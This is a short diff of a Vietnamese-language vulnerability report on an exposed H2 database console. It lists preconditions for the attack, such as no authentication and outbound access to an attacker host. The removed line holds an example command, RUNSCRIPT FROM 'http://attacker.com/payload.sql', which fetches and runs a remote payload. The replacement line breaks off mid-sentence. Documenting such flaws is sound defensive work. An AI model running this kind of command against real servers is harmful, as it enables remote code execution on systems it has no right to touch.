@@ -14,7 +14,7 @@ Mức độ: High
 
 •   Không cấu hình xác thực hoặc chặn quyền truy cập console	Mặc định, H2 không yêu cầu xác thực mạnh nếu không tự cấu hình.
 
-•   Máy chủ có thể kết nối outbound đến attacker (ví dụ để tải script .sql từ internet)	Để thực thi payload từ xa qua lệnh RUNSCRIPT FROM 'http://attacker.com/payload.sql'
+•   Máy chủ có thể kết nối outbound đến attacker để thực thi payload từ xa qua 
 
 **2. Mô tả lỗ hổng**
 
